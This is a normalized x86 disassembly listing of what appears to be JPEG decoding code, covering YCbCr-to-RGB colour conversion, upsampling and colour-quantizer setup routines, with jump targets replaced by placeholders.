push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov ebx [ eax + 0x1b6 ]
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov esi 0x2
mov eax [ ebx + 0x2c ]
cmp esi eax
jbe r-xdata
push 0x0
push 0x1
mov eax [ ebx + 0x28 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
shl ecx 0x2
add ecx edx
lea eax [ ebx + 0x20 ]
xor edx edx
call sub_464490
mov esi 0x1
xor eax eax
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub ecx eax
cmp ecx esi
jae r-xdata
mov esi eax
mov ecx [ ebp + 0xc ]
add [ ecx ] esi
sub [ ebx + 0x2c ] esi
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx [ edx + eax * 4 ]
cmp esi 0x1
mov [ ebp - 0x14 ] ecx
jbe r-xdata
mov esi ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0xc ]
inc [ eax ]
mov edx [ ebx + 0x20 ]
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x24 ] 0x1
mov eax [ edx + eax * 4 + 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx ]
mov edx [ ebp - 0x8 ]
call [ ebx + 0xc ]
sub_45d5bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx ecx
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x1b6 ]
mov esi edx
mov ecx [ ecx ]
shl ecx 0x2
add ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebx ]
mov edx [ ebp - 0x4 ]
call [ esi + 0xc ]
mov eax [ ebp + 0xc ]
inc [ eax ]
inc [ ebx ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_45d5f4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x1b6 ]
mov eax [ ebp - 0x4 ]
mov esi [ ebx + 0x10 ]
mov eax [ eax + 0x136 ]
mov [ ebp - 0x24 ] esi
mov esi [ ebx + 0x14 ]
mov [ ebp - 0x28 ] esi
mov esi [ ebx + 0x18 ]
mov [ ebp - 0x2c ] esi
mov ebx [ ebx + 0x1c ]
mov [ ebp - 0x30 ] ebx
mov ebx [ edx ]
mov ebx [ ebx + ecx * 4 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ edx + 0x4 ]
mov ebx [ ebx + ecx * 4 ]
mov [ ebp - 0x18 ] ebx
mov edx [ edx + 0x8 ]
mov ecx [ edx + ecx * 4 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + 0x6c ]
mov edx [ edx ]
shr ecx 0x1
mov [ ebp - 0x20 ] ecx
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x6c ] 0x1
je r-xdata
mov ecx [ ebp - 0x18 ]
movzx ecx [ ecx ]
inc [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
inc [ ebp - 0x1c ]
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x30 ]
mov edi [ ebp - 0x10 ]
mov esi [ ebx + ecx * 4 ]
mov ebx [ ebp - 0x2c ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x28 ]
sar esi 0x10
mov ecx [ ebx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx ]
inc [ ebp - 0x14 ]
mov edi [ ebp - 0x8 ]
lea ebx [ eax + ecx ]
mov bl [ ebx + edi ]
mov [ edx + 0x2 ] bl
lea ebx [ eax + ecx ]
lea ecx [ eax + ecx ]
mov bl [ ebx + esi ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0xc ]
mov cl [ ecx + ebx ]
mov [ edx ] cl
add edx 0x3
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx ]
inc [ ebp - 0x14 ]
mov edi [ ebp - 0x8 ]
lea ebx [ eax + ecx ]
mov bl [ ebx + edi ]
mov [ edx + 0x2 ] bl
lea ebx [ eax + ecx ]
lea ecx [ eax + ecx ]
mov bl [ ebx + esi ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0xc ]
mov cl [ ecx + ebx ]
mov [ edx ] cl
add edx 0x3
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x0
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
movzx ecx [ ecx ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x30 ]
mov edi [ ebp - 0x10 ]
mov esi [ ebx + ecx * 4 ]
mov ebx [ ebp - 0x2c ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x28 ]
sar esi 0x10
mov ecx [ ebx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x8 ]
movzx ecx [ ecx ]
lea ebx [ eax + ecx ]
mov bl [ ebx + edi ]
mov [ edx + 0x2 ] bl
lea ebx [ eax + ecx ]
add eax ecx
mov bl [ ebx + esi ]
mov [ edx + 0x1 ] bl
mov ecx [ ebp - 0xc ]
mov al [ eax + ecx ]
mov [ edx ] al
sub_45d76c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b6 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x136 ]
mov esi [ eax + 0x10 ]
mov [ ebp - 0x30 ] esi
mov esi [ eax + 0x14 ]
mov [ ebp - 0x34 ] esi
mov esi [ eax + 0x18 ]
mov [ ebp - 0x38 ] esi
mov eax [ eax + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x8 ]
add eax eax
mov esi [ edx ]
mov esi [ esi + eax * 4 ]
mov [ ebp - 0x1c ] esi
mov esi [ edx ]
mov eax [ esi + eax * 4 + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax [ edx + 0x4 ]
mov esi [ ebp - 0x8 ]
mov eax [ eax + esi * 4 ]
mov [ ebp - 0x24 ] eax
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x6c ]
shr edx 0x1
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0x2c ] 0x0
jbe r-xdata
mov edx [ ebp - 0x4 ]
test [ edx + 0x6c ] 0x1
je r-xdata
mov edx [ ebp - 0x24 ]
movzx edx [ edx ]
inc [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
movzx ebx [ ebx ]
mov [ ebp - 0x14 ] ebx
inc [ ebp - 0x28 ]
mov ebx [ ebp - 0x30 ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x3c ]
mov edi [ ebp - 0x14 ]
mov esi [ ebx + edx * 4 ]
mov ebx [ ebp - 0x38 ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x34 ]
sar esi 0x10
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x1c ]
movzx edx [ edx ]
inc [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov [ eax + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
add eax 0x3
mov edx [ ebp - 0x1c ]
movzx edx [ edx ]
inc [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov [ eax + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
add eax 0x3
mov edx [ ebp - 0x20 ]
movzx edx [ edx ]
inc [ ebp - 0x20 ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov edi [ ebp - 0x18 ]
mov [ edi + 0x2 ] bl
lea ebx [ ecx + edx ]
mov edi [ ebp - 0x18 ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ edi + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov ebx [ ebp - 0x18 ]
mov [ ebx ] dl
add [ ebp - 0x18 ] 0x3
mov edx [ ebp - 0x20 ]
movzx edx [ edx ]
inc [ ebp - 0x20 ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov edi [ ebp - 0x18 ]
mov [ edi + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov esi [ ebp - 0x18 ]
mov [ esi + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov ebx [ ebp - 0x18 ]
mov [ ebx ] dl
add [ ebp - 0x18 ] 0x3
dec [ ebp - 0x2c ]
cmp [ ebp - 0x2c ] 0x0
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
movzx edx [ edx ]
movzx ebx [ ebx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0x30 ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x3c ]
mov edi [ ebp - 0x14 ]
mov esi [ ebx + edx * 4 ]
mov ebx [ ebp - 0x38 ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x34 ]
sar esi 0x10
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
movzx edx [ edx ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov [ eax + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
xor edx edx
mov eax [ ebp - 0x20 ]
mov dl [ eax ]
mov eax [ ebp - 0xc ]
lea ebx [ ecx + edx ]
mov al [ ebx + eax ]
mov ebx [ ebp - 0x18 ]
mov [ ebx + 0x2 ] al
lea eax [ ecx + edx ]
mov ebx [ ebp - 0x18 ]
lea edx [ ecx + edx ]
mov al [ eax + esi ]
mov [ ebx + 0x1 ] al
mov eax [ ebp - 0x10 ]
mov cl [ edx + eax ]
mov eax [ ebp - 0x18 ]
mov [ eax ] cl
sub_45d9a4
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x30
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
xor eax eax
mov [ esi + 0x1b6 ] ebx
mov [ ebx ] sub_45d4f0
mov [ ebx + 0x8 ] eax
mov edx [ esi + 0x6c ]
imul edx [ esi + 0x74 ]
mov [ ebx + 0x28 ] edx
cmp [ esi + 0x12a ] 0x2
jne r-xdata
mov [ ebx + 0x4 ] sub_45d5bc
mov [ ebx + 0xc ] sub_45d5f4
xor eax eax
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x4 ] sub_45d504
mov eax esi
mov edx 0x1
mov [ ebx + 0xc ] sub_45d76c
mov edi [ eax + 0x4 ]
mov ecx [ ebx + 0x28 ]
call [ edi + 0x4 ]
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax esi
call sub_45d438
pop edi
pop esi
pop ebx
retn
sub_45da24
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x400
mov ebx [ esi + 0x1ba ]
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x8 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0xc ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x10 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x14 ] eax
xor eax eax
mov edx 0xffffff80
imul ecx edx 0x166e9
add ecx 0x8000
mov esi [ ebx + 0x8 ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0x1c5a2
add ecx 0x8000
mov esi [ ebx + 0xc ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffff492e
mov esi [ ebx + 0x10 ]
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffffa7e6
mov esi [ ebx + 0x14 ]
add ecx 0x8000
inc edx
mov [ esi + eax * 4 ] ecx
inc eax
cmp eax 0xff
jle r-xdata
pop edi
pop esi
pop ebx
retn
sub_45dadc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x1ba ]
mov ecx [ eax + 0x6c ]
mov [ ebp - 0x18 ] ecx
mov ecx [ eax + 0x136 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x24 ] eax
mov edx [ edx + 0x14 ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
xor edi edi
mov edx [ eax ]
mov eax [ ebp - 0x8 ]
mov edx [ edx + eax * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esi [ eax + esi * 4 ]
inc [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add [ ebp + 0xc ] 0x4
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] edx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x2c ]
mov ebx [ ebp - 0x30 ]
movzx edx [ edx ]
movzx ebx [ ebx ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x34 ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x1c ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
lea esi [ ecx + edx ]
mov bl [ esi + ebx ]
mov [ eax + 0x2 ] bl
mov ebx [ ebp - 0x28 ]
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov esi [ ebp - 0x24 ]
add ebx [ esi + edi * 4 ]
lea esi [ ecx + edx ]
sar ebx 0x10
lea edx [ ecx + edx ]
mov bl [ esi + ebx ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0xc ]
mov ebx [ ebx + esi * 4 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
add eax 0x3
inc [ ebp - 0x14 ]
inc [ ebp - 0x34 ]
inc [ ebp - 0x30 ]
inc [ ebp - 0x2c ]
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
sub_45dbe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ eax + 0x20 ]
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x6c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc ecx
add [ ebp + 0xc ] 0x4
mov eax [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
mov esi [ ebx ]
mov eax [ eax ]
add esi [ ebp - 0xc ]
test edi edi
mov eax [ eax + ecx * 4 ]
jbe r-xdata
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov bl [ eax ]
mov [ esi ] bl
inc eax
add esi [ ebp - 0x4 ]
dec edi
test edi edi
ja r-xdata
sub_45dc54
push ebp
mov ebp esp
push ebx
push 0x0
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ eax + 0x6c ]
push eax
mov eax [ edx ]
mov edx ecx
mov ecx [ ebp + 0xc ]
call sub_464490
pop ebx
pop ebp
retn 0x8
sub_45dc74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ eax + 0x6c ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ edx ]
mov ebx [ ebp + 0xc ]
xor edi edi
mov eax [ eax + ecx * 4 ]
mov esi [ ebx ]
inc ecx
add [ ebp + 0xc ] 0x4
cmp edi [ ebp - 0x4 ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov bl [ eax ]
inc edi
mov [ esi + 0x2 ] bl
mov bl [ eax ]
mov [ esi + 0x1 ] bl
mov bl [ eax ]
inc eax
mov [ esi ] bl
add esi 0x3
cmp edi [ ebp - 0x4 ]
jb r-xdata
sub_45dcc0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x1ba ]
mov ecx [ eax + 0x6c ]
mov [ ebp - 0x1c ] ecx
mov ecx [ eax + 0x136 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x28 ] eax
mov edx [ edx + 0x14 ]
mov [ ebp - 0x2c ] edx
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
xor edi edi
mov edx [ eax ]
mov eax [ ebp - 0x8 ]
mov edx [ edx + eax * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
inc [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add [ ebp + 0xc ] 0x4
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x3c ] esi
mov esi [ ebp - 0x14 ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x30 ]
mov ebx [ ebp - 0x34 ]
movzx edx [ edx ]
movzx ebx [ ebx ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x38 ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov esi 0xff
add ebx edx
sub esi ebx
mov bl [ ecx + esi ]
mov [ eax ] bl
mov ebx [ ebp - 0x2c ]
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov esi [ ebp - 0x28 ]
add ebx [ esi + edi * 4 ]
mov esi 0xff
sar ebx 0x10
add ebx edx
sub esi ebx
mov bl [ ecx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0xc ]
add edx [ ebx + esi * 4 ]
mov ebx 0xff
sub ebx edx
mov dl [ ecx + ebx ]
mov [ eax + 0x2 ] dl
mov edx [ ebp - 0x3c ]
mov dl [ edx ]
mov [ eax + 0x3 ] dl
add eax 0x4
inc [ ebp - 0x18 ]
inc [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
inc [ ebp - 0x30 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x1c ]
jb r-xdata
sub_45de04
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x18
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
mov [ ebx + 0x1ba ] esi
mov [ esi ] sub_45de00
mov eax [ ebx + 0x24 ]
dec eax
je r-xdata
cmp [ ebx + 0x20 ] 0x1
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
mov ecx [ ebx + 0x28 ]
dec ecx
je r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x20 ] 0x3
je r-xdata
sub eax 0x2
jb r-xdata
mov [ ebx + 0x74 ] 0x1
mov eax [ ebx + 0x24 ]
cmp eax 0x1
je r-xdata
dec ecx
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x20 ] 0x4
je r-xdata
jmp r-xdata
mov [ esi + 0x4 ] sub_45dc54
mov eax 0x1
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov [ ebx + 0x74 ] 0x3
cmp [ ebx + 0x24 ] 0x3
jne r-xdata
sub ecx 0x2
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x20 ] 0x1
jge r-xdata
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x19
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] sub_45dadc
mov eax ebx
call sub_45da24
jmp r-xdata
mov [ ebx + 0x74 ] 0x4
cmp [ ebx + 0x24 ] 0x5
jne r-xdata
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx [ ebx + 0xd4 ]
shl edx 0x3
xor esi esi
sub edx eax
inc eax
lea edx [ edx + edx * 2 ]
mov [ ecx + edx * 4 + 0x30 ] esi
jmp r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
cmp [ ebx + 0x24 ] 0x1
jne r-xdata
mov [ esi + 0x4 ] sub_45dbe4
jmp r-xdata
cmp [ ebx + 0x24 ] 0x4
jne r-xdata
mov [ esi + 0x4 ] sub_45dcc0
mov eax ebx
call sub_45da24
jmp r-xdata
mov ecx [ ebx + 0x28 ]
cmp ecx [ ebx + 0x24 ]
jne r-xdata
mov ecx [ ebx + 0x74 ]
mov [ ebx + 0x78 ] ecx
pop esi
pop ebx
retn
mov [ ebx + 0x78 ] 0x1
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov [ esi + 0x4 ] sub_45dc74
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov [ esi + 0x4 ] sub_45dbe4
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x74 ] eax
mov [ esi + 0x4 ] sub_45dbe4
jmp r-xdata
sub_45dfd0
push ebx
push esi
push edi
add esp 0xffffffe8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x74 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x5c ]
mov [ esp + 0xc ] eax
mov ebx 0x1
cmp eax [ esp + 0xc ]
jle r-xdata
imul eax ebx
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
inc ebx
mov eax ebx
mov ecx 0x1
cmp ecx [ esp + 0x8 ]
jge r-xdata
dec ebx
cmp ebx 0x2
jge r-xdata
mov esi 0x1
xor ecx ecx
mov eax [ esp + 0x4 ]
cmp ecx [ esp + 0x8 ]
jge r-xdata
mov edx [ esp ]
mov edx [ edx ]
mov [ edx + 0x14 ] 0x37
mov [ edx + 0x18 ] eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx ]
xor edx edx
mov [ esp + 0x10 ] edx
xor ecx ecx
mov [ esp + 0x14 ] rw-data
cmp ecx [ esp + 0x8 ]
jge r-xdata
mov [ eax ] ebx
imul esi ebx
inc ecx
add eax 0x4
cmp ecx [ esp + 0x8 ]
jl r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x28 ] 0x2
jne r-xdata
mov eax esi
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov ebx ecx
mov edx [ esp + 0x14 ]
mov ebx [ edx ]
jmp r-xdata
mov edx [ esp + 0x4 ]
inc ecx
mov esi eax
inc [ edx + ebx * 4 ]
mov [ esp + 0x10 ] 0x1
add [ esp + 0x14 ] 0x4
cmp ecx [ esp + 0x8 ]
jl r-xdata
mov eax [ esp + 0x4 ]
push [ eax + ebx * 4 ]
mov eax esi
pop edx
mov edi edx
cdq
idiv edi
mov edx [ esp + 0x4 ]
mov edx [ edx + ebx * 4 ]
inc edx
imul eax edx
cmp eax [ esp + 0xc ]
jg r-xdata
sub_45e0c8
push ebp
mov ebp esp
mov eax ecx
push ebx
shl eax 0x8
mov ebx [ ebp + 0x8 ]
mov edx ebx
sub eax ecx
sar edx 0x1
jns r-xdata
add eax edx
cdq
idiv ebx
pop ebx
pop ebp
retn 0x4
adc edx 0x0
sub_45e0ec
add ecx ecx
push ebp
mov ebp esp
mov eax ecx
shl eax 0x8
push ebx
mov ebx [ ebp + 0x8 ]
sub eax ecx
add eax ebx
add ebx ebx
add eax 0xff
cdq
idiv ebx
pop ebx
pop ebp
retn 0x4
sub_45e110
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1be ]
mov [ esp + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov eax [ esp ]
add edx 0x20
call sub_45dfd0
mov [ esp + 0xc ] eax
mov ecx [ esp ]
cmp [ ecx + 0x74 ] 0x3
jne r-xdata
mov eax [ esp ]
mov eax [ eax ]
mov [ eax + 0x14 ] 0x5e
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp ]
mov eax [ eax ]
add eax 0x18
mov edx [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x24 ]
mov [ eax + 0x8 ] edx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x28 ]
mov [ eax + 0xc ] edx
mov eax [ esp ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5d
mov edx 0x1
mov eax [ esp ]
mov ecx [ eax ]
